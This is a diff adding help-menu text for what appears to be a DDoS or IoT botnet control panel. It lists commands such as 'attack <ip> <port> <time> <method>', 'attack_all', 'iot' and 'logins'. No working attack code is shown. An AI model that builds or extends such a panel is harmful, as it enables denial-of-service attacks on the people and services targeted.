@@ -1,0 +1,11 @@
+place_text(5,29)=Attack      ║ attack <ip> <port> <time> <method>
+place_text(6,29)=Attack all  ║ attack_all <ip> <port> <time> <method>
+place_text(7,29)=Users       ║ users
+place_text(8,29)=ioT         ║ iot
+place_text(9,29)=Message     ║ msg <user> <msg>
+place_text(10,29)=Ticket      ║ ticket <msg>
+place_text(11,29)=Logs        ║ logs
+place_text(12,29)=attacks     ║ attacks
+place_text(13,29)=logins      ║ logins
+place_text(14,29)=admin       ║ admin
+place_text(18,29)=Please note that not all these commands are added yet!
